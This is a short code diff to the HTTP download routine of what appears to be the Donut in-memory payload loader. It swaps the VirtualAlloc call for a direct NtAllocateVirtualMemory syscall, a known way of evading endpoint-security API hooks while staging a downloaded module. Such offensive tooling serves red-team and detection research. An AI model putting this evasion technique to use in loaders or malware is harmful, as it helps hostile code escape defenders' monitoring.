@@ -38,6 +38,11 @@ BOOL DownloadFromHTTP(PDONUT_INSTANCE inst) {
     CHAR            host[MAX_PATH], 
                     file[MAX_PATH],
                     username[64], password[64];
+    SIZE_T          rs;
+    NTSTATUS        status;
+    PSYSCALL_LIST   syscall_list;
+  
+    syscall_list = (PSYSCALL_LIST)(ULONG_PTR)inst->syscall_list;
     
     // default flags for HTTP client
     DWORD flags = INTERNET_FLAG_KEEP_CONNECTION | 
@@ -246,13 +251,10 @@ BOOL DownloadFromHTTP(PDONUT_INSTANCE inst) {
        
         if(inbuf != NULL && inlen != 0) {
           DPRINT("Copying %i bytes to VM", inlen);
-          inst->module.p = 
-            inst->api.VirtualAlloc(
-              NULL, inlen, 
-              MEM_COMMIT | MEM_RESERVE,
-              PAGE_READWRITE);
+          rs = inlen;
+          status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&inst->module.p, 0, &rs, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, syscall_list);
           
-          if(inst->module.p != NULL) {
+          if(NT_SUCCESS(status)) {
             Memcpy(inst->module.p, inbuf, inlen);
             bResult = TRUE;
           } else {
